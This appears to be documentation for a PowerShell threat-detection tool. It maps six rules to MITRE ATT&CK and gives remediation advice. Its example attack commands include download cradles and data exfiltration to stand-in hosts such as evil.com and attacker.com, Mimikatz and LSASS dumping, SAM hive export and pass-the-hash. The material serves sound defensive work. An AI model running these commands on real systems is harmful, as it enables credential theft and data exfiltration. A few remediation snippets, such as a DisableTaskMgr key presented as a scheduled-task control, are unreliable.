# Advanced Attack Detection Rules - MITRE ATT&CK Mapping & Remediation Guide

## Overview

This document provides detailed information about the 6 advanced PowerShell attack detection rules (Rules 47-52), including their mapping to the MITRE ATT&CK framework and comprehensive remediation guidance.

---

## Rule 47: PowerShell Obfuscation Detection

### Description
Detects obfuscation techniques commonly used in malicious PowerShell scripts to evade detection and analysis.

### MITRE ATT&CK Mapping
- **T1027**: Obfuscated Files or Information
- **T1027.010**: Command Obfuscation
- **T1059.001**: Command and Scripting Interpreter: PowerShell

### Detection Patterns

#### 1. Base64 Encoded Commands (Critical)
**Pattern**: `-EncodedCommand`, `-enc`, `-e` parameters or `FromBase64String` method calls

**Example**:
```powershell
powershell.exe -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
[System.Convert]::FromBase64String($encoded)
```

**Why it's dangerous**: Attackers encode malicious commands to bypass signature-based detection and hide payloads.

#### 2. String Concatenation Obfuscation (High)
**Pattern**: Excessive string concatenation (5+ operations)

**Example**:
```powershell
$cmd = "I" + "n" + "v" + "o" + "k" + "e" + "-" + "E" + "x" + "p" + "r" + "e" + "s" + "s" + "i" + "o" + "n"
```

**Why it's dangerous**: Splits command names to evade string-based detection.

#### 3. Character Code Conversion (High)
**Pattern**: Multiple `[char]` type conversions (5+ instances)

**Example**:
```powershell
$cmd = [char]73 + [char]69 + [char]88  # "IEX"
```

**Why it's dangerous**: Converts ASCII codes to characters to hide command strings.

#### 4. Format String Obfuscation (High)
**Pattern**: Format strings with 5+ placeholders

**Example**:
```powershell
$template = "{0}{1}{2}{3}{4}{5}"
$cmd = $template -f 'I','n','v','o','k','e'
```

**Why it's dangerous**: Reconstructs commands dynamically to avoid static analysis.

#### 5. String Reversal (High)
**Pattern**: `ToCharArray()`, `Reverse()` methods

**Example**:
```powershell
$reversed = "noisserpxE-ekovnI"  # "Invoke-Expression" reversed
-join ($reversed.ToCharArray() | % {$_})
```

**Why it's dangerous**: Reverses strings to hide malicious keywords.

### Remediation Guidance

#### Immediate Actions
1. **Quarantine affected systems**: Isolate systems showing obfuscated script execution
2. **Review execution logs**: Check PowerShell transcripts and event logs (Event ID 4104)
3. **Decode payloads**: Use safe sandboxes to decode and analyze obfuscated content
4. **Hunt for related activity**: Search for other instances across the environment

#### Prevention Measures
1. **Enable PowerShell logging**:
   ```powershell
   # Enable Script Block Logging
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
   
   # Enable Module Logging
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
   ```

2. **Configure Constrained Language Mode**:
   ```powershell
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
   ```

3. **Implement Application Control**:
   - Use AppLocker or Windows Defender Application Control (WDAC)
   - Block unsigned PowerShell scripts
   - Restrict PowerShell execution to authorized users

4. **Deploy AMSI (Anti-Malware Scan Interface)**:
   - Ensure Windows Defender and other AMSI-aware AV products are up to date
   - Monitor AMSI bypass attempts

#### Long-term Strategy
1. **Baseline normal PowerShell usage** in your environment
2. **Implement behavior-based detection** using SIEM/EDR
3. **Regular security awareness training** on script security
4. **Adopt Just Enough Administration (JEA)** to limit PowerShell capabilities

---

## Rule 48: Download Cradle Detection

### Description
Detects download cradles that fetch and execute remote code without touching disk, a common malware delivery technique.

### MITRE ATT&CK Mapping
- **T1105**: Ingress Tool Transfer
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1204.002**: User Execution: Malicious File
- **T1027.004**: Obfuscated Files or Information: Compile After Delivery
- **T1620**: Reflective Code Loading
- **T1197**: BITS Jobs

### Detection Patterns

#### 1. Classic WebClient Download with IEX (Critical)
**Pattern**: `IEX (New-Object Net.WebClient).DownloadString(...)`

**Example**:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
```

**Why it's dangerous**: Downloads and executes code directly in memory without creating files.

#### 2. Invoke-WebRequest/RestMethod with IEX (Critical)
**Pattern**: Web request commands piped to `IEX` or `Invoke-Expression`

**Example**:
```powershell
Invoke-WebRequest -Uri 'http://evil.com/script.ps1' | IEX
irm http://attacker.com/cmd.ps1 | iex
```

**Why it's dangerous**: Modern cmdlets used for fileless payload delivery.

#### 3. BitsTransfer + Execution (Critical)
**Pattern**: `Start-BitsTransfer` followed by execution commands

**Example**:
```powershell
Start-BitsTransfer -Source 'http://malware.com/backdoor.exe' -Destination 'C:\Temp\backdoor.exe'
Start-Process 'C:\Temp\backdoor.exe'
```

**Why it's dangerous**: Uses legitimate Windows service to download malware stealthily.

#### 4. Reflective Assembly Loading (Critical)
**Pattern**: `[Reflection.Assembly]::Load()` with web-downloaded content

**Example**:
```powershell
[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://attacker.com/evil.dll'))
```

**Why it's dangerous**: Loads .NET assemblies directly into memory, completely bypassing disk.

### Remediation Guidance

#### Immediate Actions
1. **Block malicious URLs**:
   - Add URLs to firewall/proxy blocklist
   - Update DNS filtering rules
   
2. **Kill active sessions**:
   ```powershell
   Get-Process -Name powershell | Where-Object {$_.CommandLine -like '*DownloadString*'} | Stop-Process -Force
   ```

3. **Check for persistence**:
   - Search for scheduled tasks, registry Run keys
   - Review startup folders and services

4. **Network forensics**:
   - Analyze proxy logs for download attempts
   - Check firewall logs for outbound connections

#### Prevention Measures
1. **Network Segmentation**:
   - Restrict internet access for servers and sensitive workstations
   - Implement egress filtering

2. **Application Whitelisting**:
   ```powershell
   # Block script execution from temporary folders
   New-AppLockerPolicy -RuleType Script -User Everyone -Action Deny -Path "$env:TEMP\*"
   ```

3. **PowerShell Execution Policy**:
   ```powershell
   Set-ExecutionPolicy AllSigned -Scope LocalMachine
   ```

4. **Web Proxy Configuration**:
   - Enable SSL inspection
   - Block known malware hosting domains
   - Alert on suspicious file downloads

5. **Disable unnecessary protocols**:
   ```powershell
   # Disable BITS if not needed
   Stop-Service -Name BITS -Force
   Set-Service -Name BITS -StartupType Disabled
   ```

#### Detection & Monitoring
1. **Monitor PowerShell Event Logs**:
   - Event ID 4104 (Script Block Logging)
   - Event ID 4103 (Module Logging)

2. **Network Monitoring**:
   - Alert on `WebClient` User-Agent strings
   - Monitor for HTTP connections from PowerShell processes

3. **EDR/SIEM Rules**:
   ```
   process_name="powershell.exe" AND 
   (command_line="*DownloadString*" OR 
    command_line="*DownloadFile*" OR
    command_line="*DownloadData*")
   ```

---

## Rule 49: Persistence Mechanism Detection

### Description
Detects persistence mechanisms that allow malware to survive system reboots and maintain access.

### MITRE ATT&CK Mapping
- **T1547.001**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- **T1053.005**: Scheduled Task/Job: Scheduled Task
- **T1546.003**: Event Triggered Execution: Windows Management Instrumentation Event Subscription
- **T1546.013**: Event Triggered Execution: PowerShell Profile
- **T1543.003**: Create or Modify System Process: Windows Service

### Detection Patterns

#### 1. Registry Run Keys (Critical)
**Pattern**: Modifications to `HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run*`

**Example**:
```powershell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware\evil.exe"
```

**Why it's dangerous**: Ensures malware executes on every system startup or user logon.

#### 2. Scheduled Tasks (High)
**Pattern**: `New-ScheduledTask`, `Register-ScheduledTask`, `schtasks`

**Example**:
```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\malware.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger
```

**Why it's dangerous**: Provides flexible, stealthy persistence with various triggers.

#### 3. WMI Event Subscriptions (Critical)
**Pattern**: `__EventFilter`, `__EventConsumer`, `FilterToConsumerBinding`

**Example**:
```powershell
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = 'ProcessStartEvent'
$filter.Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process'"
```

**Why it's dangerous**: Extremely stealthy, survives reboots, difficult to detect.

#### 4. PowerShell Profile Modification (High)
**Pattern**: Modifications to `$PROFILE` files

**Example**:
```powershell
Add-Content -Path $PROFILE -Value "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/load.ps1')"
```

**Why it's dangerous**: Executes malicious code every time PowerShell starts.

### Remediation Guidance

#### Immediate Actions
1. **Remove persistence entries**:
   ```powershell
   # Remove registry Run key
   Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SuspiciousEntry"
   
   # Remove scheduled task
   Unregister-ScheduledTask -TaskName "MaliciousTask" -Confirm:$false
   
   # Clean PowerShell profile
   Get-Content $PROFILE | Where-Object {$_ -notmatch 'malicious-pattern'} | Set-Content $PROFILE
   ```

2. **Hunt for WMI persistence**:
   ```powershell
   Get-WmiObject -Namespace root\subscription -Class __EventFilter
   Get-WmiObject -Namespace root\subscription -Class __EventConsumer
   Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
   ```

3. **Remove WMI persistence**:
   ```powershell
   Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='EvilFilter'" | Remove-WmiObject
   ```

#### Prevention Measures
1. **Registry Monitoring**:
   - Enable SACL auditing on Run keys
   - Use File Integrity Monitoring (FIM)

2. **Scheduled Task Policies**:
   ```powershell
   # Require administrators to create scheduled tasks
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1
   ```

3. **WMI Hardening**:
   - Limit WMI access to administrators only
   - Monitor WMI repository changes

4. **PowerShell Profile Protection**:
   ```powershell
   # Make profile read-only
   Set-ItemProperty -Path $PROFILE -Name IsReadOnly -Value $true
   ```

#### Long-term Strategy
1. **Implement Autoruns monitoring** (Sysinternals)
2. **Deploy EDR** with persistence detection capabilities
3. **Regular persistence audits**:
   ```powershell
   # Audit script
   Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run*"
   Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq 'SYSTEM'}
   Get-Service | Where-Object {$_.StartType -eq 'Automatic'}
   ```

---

## Rule 50: Credential Harvesting Detection

### Description
Detects credential harvesting and password dumping techniques used to steal authentication credentials.

### MITRE ATT&CK Mapping
- **T1003.001**: OS Credential Dumping: LSASS Memory
- **T1003.002**: OS Credential Dumping: Security Account Manager
- **T1555.003**: Credentials from Password Stores: Credentials from Web Browsers
- **T1555.004**: Credentials from Password Stores: Windows Credential Manager
- **T1552.001**: Unsecured Credentials: Credentials In Files

### Detection Patterns

#### 1. Mimikatz Usage (Critical)
**Pattern**: Keywords like `mimikatz`, `sekurlsa`, `logonpasswords`, `gentilkiwi`

**Example**:
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Why it's dangerous**: Most powerful credential dumping tool, extracts plaintext passwords from memory.

#### 2. LSASS Process Dumping (Critical)
**Pattern**: `Out-Minidump`, `procdump`, `MiniDumpWriteDump` targeting lsass

**Example**:
```powershell
Get-Process lsass | Out-Minidump -DumpFilePath C:\Temp\lsass.dmp
procdump.exe -ma lsass.exe lsass.dmp
```

**Why it's dangerous**: Creates memory dump of LSASS for offline credential extraction.

#### 3. Browser Credential Theft (High)
**Pattern**: Access to Chrome/Firefox/Edge credential databases

**Example**:
```powershell
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "C:\Temp\stolen.db"
```

**Why it's dangerous**: Extracts saved passwords from web browsers.

#### 4. Registry Hive Extraction (Critical)
**Pattern**: `reg save` targeting SAM, SYSTEM, SECURITY hives

**Example**:
```powershell
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
```

**Why it's dangerous**: Exports password hashes for offline cracking.

#### 5. WiFi Password Extraction (High)
**Pattern**: `netsh wlan show profile key=clear`

**Example**:
```powershell
netsh wlan show profile name="WiFi-Network" key=clear
```

**Why it's dangerous**: Reveals WiFi passwords in plaintext.

### Remediation Guidance

#### Immediate Actions
1. **Reset all credentials** on affected systems:
   ```powershell
   # Force password reset for all users
   Get-ADUser -Filter * | Set-ADUser -ChangePasswordAtLogon $true
   ```

2. **Revoke active sessions**:
   ```powershell
   # Log off all users
   query session | Select-String "Active" | ForEach-Object {
       $sessionId = $_.ToString().Split()[2]
       logoff $sessionId
   }
   ```

3. **Check for LSASS dump files**:
   ```powershell
   Get-ChildItem -Path C:\ -Recurse -Filter "*lsass*.dmp" -ErrorAction SilentlyContinue
   ```

4. **Review credential access logs**:
   - Event ID 4656 (Handle to an Object Requested)
   - Event ID 4663 (Attempt to Access Object)

#### Prevention Measures
1. **Enable Credential Guard**:
   ```powershell
   # Requires Windows 10 Enterprise or Windows Server 2016+
   # Enable via Group Policy: Computer Configuration > Administrative Templates > System > Device Guard
   ```

2. **LSA Protection**:
   ```powershell
   # Enable LSASS as protected process
   New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -PropertyType DWORD
   ```

3. **Restrict Debug Privileges**:
   - Remove `SeDebugPrivilege` from non-admin users
   - Use Group Policy: Security Settings > User Rights Assignment

4. **Browser Security**:
   - Enforce master password in browsers
   - Deploy browser management policies
   - Use password managers with encryption

5. **Network Segmentation**:
   - Segment credential servers (domain controllers)
   - Implement Privileged Access Workstations (PAWs)

#### Detection & Monitoring
1. **LSASS Access Monitoring**:
   ```powershell
   # Enable auditing on LSASS process
   $lsass = Get-Process lsass
   # Monitor Event ID 4656, 4663 with target object = lsass.exe
   ```

2. **Sysmon Rules**:
   ```xml
   <ProcessAccess onmatch="include">
       <TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
   </ProcessAccess>
   ```

3. **EDR Rules**:
   - Alert on any process accessing LSASS with PROCESS_VM_READ
   - Monitor for registry hive exports
   - Detect Mimikatz signatures

---

## Rule 51: Lateral Movement Detection

### Description
Detects lateral movement techniques used to spread across networks and compromise additional systems.

### MITRE ATT&CK Mapping
- **T1021.006**: Remote Services: Windows Remote Management
- **T1021.002**: Remote Services: SMB/Windows Admin Shares
- **T1047**: Windows Management Instrumentation
- **T1135**: Network Share Discovery
- **T1550.002**: Use Alternate Authentication Material: Pass the Hash
- **T1543.003**: Create or Modify System Process: Windows Service
- **T1569.002**: System Services: Service Execution

### Detection Patterns

#### 1. Remote WMI Execution (Critical)
**Pattern**: `Invoke-WmiMethod`, `Invoke-CimMethod` with `-ComputerName` and process creation

**Example**:
```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName "target-server"
```

**Why it's dangerous**: Executes commands on remote systems without installing agents.

#### 2. Remote Scheduled Tasks (Critical)
**Pattern**: `Register-ScheduledTask` with `-ComputerName` or `schtasks /s`

**Example**:
```powershell
Register-ScheduledTask -TaskName "Backdoor" -Action $action -Trigger $trigger -ComputerName "remote-host"
```

**Why it's dangerous**: Provides persistent remote execution capability.

#### 3. SMB Share Enumeration (High)
**Pattern**: `net view`, `net share`, `Get-SmbShare` with UNC paths

**Example**:
```powershell
net view \\target-server
Get-SmbShare -CimSession $remoteSession
```

**Why it's dangerous**: Reconnaissance for finding accessible shares and data.

#### 4. PSRemoting (Critical with Credentials)
**Pattern**: `New-PSSession`, `Enter-PSSession`, `Invoke-Command` with `-ComputerName`

**Example**:
```powershell
$session = New-PSSession -ComputerName "target" -Credential $cred
Invoke-Command -Session $session -ScriptBlock { whoami }
```

**Why it's dangerous**: Full remote PowerShell access to target systems.

#### 5. Pass-the-Hash (Critical)
**Pattern**: Tools like `Invoke-WMIExec`, `Invoke-SMBExec`, `Invoke-PSExec`

**Example**:
```powershell
Invoke-WMIExec -Target 192.168.1.10 -Username admin -Hash NTLMHASH
```

**Why it's dangerous**: Uses stolen credential hashes without knowing plaintext passwords.

### Remediation Guidance

#### Immediate Actions
1. **Isolate compromised systems**:
   ```powershell
   # Disable network adapter
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   ```

2. **Kill remote sessions**:
   ```powershell
   Get-PSSession | Remove-PSSession
   Get-CimSession | Remove-CimSession
   ```

3. **Check for unauthorized remote connections**:
   ```powershell
   Get-EventLog -LogName Security -InstanceId 4624 | Where-Object {$_.Message -match "Logon Type:\s+3"}
   ```

4. **Review recent admin activities**:
   - Event ID 4624 (Logon)
   - Event ID 4672 (Special Privileges Assigned)
   - Event ID 5140 (Network Share Accessed)

#### Prevention Measures
1. **Disable WMI Remoting** where not needed:
   ```powershell
   Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled False
   ```

2. **Restrict PSRemoting**:
   ```powershell
   Disable-PSRemoting -Force
   # Or configure trusted hosts
   Set-Item WSMan:\localhost\Client\TrustedHosts -Value "authorized-server1,authorized-server2"
   ```

3. **Local Admin Restrictions**:
   - Implement Local Administrator Password Solution (LAPS)
   - Remove domain users from local admin groups
   - Use separate credentials for admin tasks

4. **Network Segmentation**:
   - Implement VLANs and firewall rules
   - Restrict SMB (445) between workstations
   - Allow admin protocols only from jump servers

5. **Disable NTLM** (use Kerberos only):
   ```powershell
   # Via Group Policy: Network Security: Restrict NTLM
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "lmcompatibilitylevel" -Value 5
   ```

#### Detection & Monitoring
1. **Monitor Authentication Events**:
   - Event ID 4624 Type 3 (Network logon)
   - Event ID 4648 (Explicit credential usage)
   - Event ID 4672 (Admin logon)

2. **Network Monitoring**:
   - Alert on SMB (445), WMI (135, 5985-5986) between workstations
   - Monitor for abnormal traffic patterns

3. **Sysmon Configuration**:
   ```xml
   <NetworkConnect onmatch="include">
       <DestinationPort condition="is">445</DestinationPort>
       <DestinationPort condition="is">5985</DestinationPort>
   </NetworkConnect>
   ```

---

## Rule 52: Data Exfiltration Detection

### Description
Detects data exfiltration techniques that send data to external locations or command-and-control servers.

### MITRE ATT&CK Mapping
- **T1048.003**: Exfiltration Over Alternative Protocol (DNS, FTP, etc.)
- **T1041**: Exfiltration Over C2 Channel
- **T1567.001**: Exfiltration Over Web Service: Exfiltration to Code Repository
- **T1567.002**: Exfiltration Over Web Service: Exfiltration to Cloud Storage
- **T1560.001**: Archive Collected Data: Archive via Utility

### Detection Patterns

#### 1. DNS Tunneling (Critical)
**Pattern**: DNS queries within loops or with encoded data

**Example**:
```powershell
foreach ($chunk in $data) {
    Resolve-DnsName "$chunk.attacker.com"
}
```

**Why it's dangerous**: Exfiltrates data through DNS queries, bypassing many security controls.

#### 2. HTTP POST with Data (High)
**Pattern**: `Invoke-WebRequest`/`Invoke-RestMethod` with `-Method POST` and `-Body`/`-InFile`

**Example**:
```powershell
$data = Get-Content "C:\Sensitive\passwords.txt"
Invoke-WebRequest -Uri "http://exfil.com/upload" -Method POST -Body $data
```

**Why it's dangerous**: Sends sensitive data to external servers.

#### 3. Pastebin/Code Sharing Sites (Critical)
**Pattern**: URLs for pastebin.com, gist.github.com, paste.ee, hastebin.com, etc.

**Example**:
```powershell
Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{api_paste_code=$secrets}
```

**Why it's dangerous**: Quick, anonymous data sharing commonly used by attackers.

#### 4. Cloud Storage Uploads (Critical)
**Pattern**: URLs for dropbox.com, drive.google.com, onedrive.live.com, AWS S3, Azure Blob Storage

**Example**:
```powershell
Invoke-WebRequest -Uri "https://mybucket.s3.amazonaws.com/exfil.zip" -Method PUT -InFile "C:\Data\sensitive.zip"
```

**Why it's dangerous**: Large storage capacity, encrypted transfers, hard to distinguish from legitimate use.

#### 5. Email with Attachments (High)
**Pattern**: `Send-MailMessage` with `-Attachments` parameter

**Example**:
```powershell
Send-MailMessage -To "attacker@evil.com" -Attachments "C:\Sensitive\data.xlsx" -SmtpServer smtp.company.com
```

**Why it's dangerous**: Direct exfiltration to attacker-controlled email.

#### 6. Data Compression Before Upload (Critical)
**Pattern**: `Compress-Archive` followed by web requests

**Example**:
```powershell
Compress-Archive -Path "C:\Sensitive\*" -DestinationPath "C:\Temp\exfil.zip"
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\Temp\exfil.zip"
```

**Why it's dangerous**: Compression reduces transfer time and file size, making exfiltration more efficient.

### Remediation Guidance

#### Immediate Actions
1. **Block malicious domains**:
   ```powershell
   # Add to DNS blocklist or firewall rules
   Add-DnsServerQueryResolutionPolicy -Name "BlockExfil" -Fqdn "attacker.com" -Action IGNORE
   ```

2. **Kill active transfers**:
   ```powershell
   Get-NetTCPConnection | Where-Object {$_.RemoteAddress -eq "malicious-ip"} | 
       ForEach-Object {Stop-Process -Id $_.OwningProcess -Force}
   ```

3. **Review uploaded data**:
   - Check firewall/proxy logs for large outbound transfers
   - Analyze packet captures if available

4. **Assess data breach impact**:
   - Identify what data was potentially exfiltrated
   - Notify affected parties if required by compliance

#### Prevention Measures
1. **Data Loss Prevention (DLP)**:
   - Implement DLP solution with content inspection
   - Block sensitive data patterns (SSN, credit cards, etc.)

2. **Egress Filtering**:
   ```powershell
   # Block outbound connections to cloud storage
   New-NetFirewallRule -DisplayName "Block Dropbox" -Direction Outbound -RemoteAddress dropbox.com -Action Block
   ```

3. **DNS Filtering**:
   - Use DNS filtering service (OpenDNS, Quad9, etc.)
   - Block newly registered domains
   - Monitor for DNS tunneling patterns

4. **Email Controls**:
   - Implement email DLP rules
   - Scan attachments for sensitive data
   - Alert on external email with attachments

5. **Web Proxy Configuration**:
   - Enable SSL inspection
   - Block file sharing sites
   - Limit HTTP methods (allow only GET for most users)

6. **Cloud App Security**:
   - Use CASB (Cloud Access Security Broker)
   - Monitor OAuth permissions
   - Enforce cloud storage policies

#### Detection & Monitoring
1. **Network Monitoring**:
   ```
   # Alert on large outbound data transfers
   outbound_bytes > 100MB in 15 minutes
   
   # Alert on DNS queries to suspicious domains
   dns_query_length > 50 characters
   ```

2. **SIEM Rules**:
   ```
   # High volume POST requests
   http_method="POST" AND bytes_out > 10MB
   
   # DNS tunneling detection
   dns_query_count > 100 per minute from single host
   ```

3. **Behavioral Analytics**:
   - Baseline normal data transfer volumes
   - Alert on deviations from normal patterns
   - Monitor after-hours activity

4. **File Monitoring**:
   ```powershell
   # Monitor large archive creation
   Get-EventLog -LogName Application | 
       Where-Object {$_.EventID -eq 4663 -and $_.Message -like "*.zip*"}
   ```

---

## Summary Table

| Rule | Name | MITRE ATT&CK | Severity | Detection Count |
|------|------|--------------|----------|-----------------|
| 47 | PowerShell Obfuscation Detection | T1027, T1027.010, T1059.001 | Critical | 7 patterns |
| 48 | Download Cradle Detection | T1105, T1059.001, T1204.002, T1027.004, T1620, T1197 | Critical | 5 patterns |
| 49 | Persistence Mechanism Detection | T1547.001, T1053.005, T1546.003, T1546.013, T1543.003 | Critical | 6 patterns |
| 50 | Credential Harvesting Detection | T1003.001, T1003.002, T1555.003, T1555.004, T1552.001 | Critical | 6 patterns |
| 51 | Lateral Movement Detection | T1021.006, T1021.002, T1047, T1135, T1550.002, T1543.003, T1569.002 | Critical | 8 patterns |
| 52 | Data Exfiltration Detection | T1048.003, T1041, T1567.001, T1567.002, T1560.001 | Critical | 8 patterns |

---

## General Best Practices

### For All Rules

1. **Defense in Depth**: No single control stops all attacks. Layer multiple defenses.

2. **Logging is Critical**:
   ```powershell
   # Enable PowerShell logging
   Enable-PSTranscription -OutputDirectory "C:\PSLogs"
   Enable-PSScriptBlockLogging
   ```

3. **Regular Audits**: Review logs and configurations regularly

4. **Incident Response Plan**: Have a documented IR plan for each attack type

5. **Threat Intelligence**: Stay updated on latest attack techniques

6. **User Education**: Train users to recognize and report suspicious activity

7. **Patch Management**: Keep systems updated to prevent exploitation

8. **Least Privilege**: Grant minimal necessary permissions

9. **Network Segmentation**: Limit lateral movement opportunities

10. **Continuous Monitoring**: Use SIEM/EDR for real-time detection

---

## Additional Resources

- **MITRE ATT&CK Framework**: https://attack.mitre.org/
- **PowerShell Security Best Practices**: https://learn.microsoft.com/powershell/scripting/security
- **Windows Security Baselines**: https://learn.microsoft.com/windows/security/threat-protection/windows-security-baselines
- **CIS PowerShell Security Benchmark**: https://www.cisecurity.org/benchmark/microsoft_windows_server
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework

---

*Document Version: 1.0*  
*Last Updated: October 2025*  
*PowerShield Advanced Detection Rules*
